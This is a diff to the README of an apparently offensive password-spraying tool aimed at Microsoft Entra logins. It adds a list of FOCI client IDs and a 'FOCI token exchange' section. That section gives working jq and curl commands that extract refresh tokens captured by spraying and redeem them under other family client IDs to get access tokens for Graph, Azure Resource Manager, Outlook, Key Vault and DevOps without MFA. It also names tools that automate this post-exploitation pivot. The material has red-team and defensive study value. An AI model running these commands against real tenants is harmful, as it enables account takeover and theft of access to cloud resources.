@@ -235,9 +235,11 @@ python3 apimspray.py --direct --mode validate-users --users users.txt --domain c
   ```bash
   python3 apimspray.py --urls urls.txt --mode validate-clients --users u.txt --passwords p.txt \
       --client-ids d3590ed6-52b3-4102-aeff-aad2292ab01c,1fec8e78-bce4-4aaf-ab1b-5451cc387264
-  # or from a file, one GUID per line:
-  python3 apimspray.py --urls urls.txt --mode validate-clients --users u.txt --passwords p.txt --client-ids client_ids.txt
+  # or from a file, one GUID per line (comment/annotation lines are ignored):
+  python3 apimspray.py --urls urls.txt --mode validate-clients --users u.txt --passwords p.txt --client-ids foci_clients.txt
   ```
+
+  The repo ships [`foci_clients.txt`](foci_clients.txt) — a curated list of well-known Microsoft first-party / **FOCI** (Family of Client IDs) app GUIDs, annotated with their app names. The parser strips `# label` lines and inline `<guid>  # name` comments, so you can keep it readable. A VALID hit through a FOCI client that requested `offline_access` yields a refresh token you can then exchange across the whole family (see [FOCI token exchange](#foci-token-exchange)).
 
   > **Note:** each pair costs one request per client ID. With a *wrong* password that multiplies failed attempts per user and can accelerate lockout — this mode is intended for credentials you already believe are valid but that appear CA-blocked.
 
@@ -254,6 +256,49 @@ By default each request randomly picks one of four built-in first-party client a
 python3 apimspray.py --urls urls.txt --mode spray --users users.txt --passwords p.txt \
     --client-id 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --resource https://outlook.office365.com
 ```
+
+### FOCI token exchange
+
+When a VALID hit returns a **refresh token** (the client app requested `offline_access` — e.g. Microsoft Office — and the token lands in `tokens.jsonl`), that refresh token is **FOCI**: it can be redeemed for a *different* family app and a *different* resource without re-authenticating. One captured RT becomes access tokens for Graph, Azure Resource Manager, Outlook, Teams, and so on — MFA and the original client are not replayed. This is a post-exploitation step; apimspray captures the seed token but does not perform the swap itself.
+
+Pull a captured refresh token out of a run:
+
+```bash
+# newest refresh token from the latest run
+jq -r 'select(.refresh_token) | .refresh_token' results/latest/tokens.jsonl | tail -n1
+```
+
+Exchange it by POSTing to the token endpoint with a **different FOCI `client_id`** and the **target resource**. Because FOCI apps are public clients, no secret is needed:
+
+```bash
+# v1 endpoint (same one apimspray uses) — swap to Azure CLI, ask for ARM
+curl -s https://login.microsoftonline.com/common/oauth2/token \
+  -d grant_type=refresh_token \
+  -d client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46 \
+  -d refresh_token="$RT" \
+  -d resource=https://management.azure.com/
+
+# v2 endpoint — scope-based instead of resource-based
+curl -s https://login.microsoftonline.com/organizations/oauth2/v2.0/token \
+  -d grant_type=refresh_token \
+  -d client_id=1b730954-1685-4b74-9bfd-dac224a7b894 \
+  -d scope="https://graph.microsoft.com/.default offline_access" \
+  -d refresh_token="$RT"
+```
+
+Each response returns a fresh access token for the requested audience **and a new FOCI refresh token**, so you can keep pivoting across resources. The `client_id` must be a FOCI member (see [`foci_clients.txt`](foci_clients.txt)) but need **not** match the one the RT was issued for — that mismatch is the whole mechanism.
+
+Common target resources (v1 `--resource`) / scopes (v2):
+
+| Target | v1 resource | v2 scope |
+| :----- | :---------- | :------- |
+| Microsoft Graph | `https://graph.microsoft.com` | `https://graph.microsoft.com/.default` |
+| Azure Resource Manager | `https://management.azure.com/` | `https://management.azure.com/.default` |
+| Outlook / Exchange | `https://outlook.office365.com` | `https://outlook.office365.com/.default` |
+| Azure Key Vault | `https://vault.azure.net` | `https://vault.azure.net/.default` |
+| Azure DevOps | `499b84ac-1321-427f-aa17-267ca6975798` | `499b84ac-1321-427f-aa17-267ca6975798/.default` |
+
+To automate the family hop, use [**ROADtools / roadtx**](https://github.com/dirkjanm/ROADtools) (`roadtx` refresh-token flows), [**TokenTactics**](https://github.com/rvrsh3ll/TokenTactics) (`Invoke-RefreshToMSGraphToken`, `Invoke-RefreshToAzureManagementToken`, …), or **AADInternals** (`Get-AADIntAccessTokenFor*` with `-RefreshToken`).
 
 ### Notifications (Teams webhook)
 
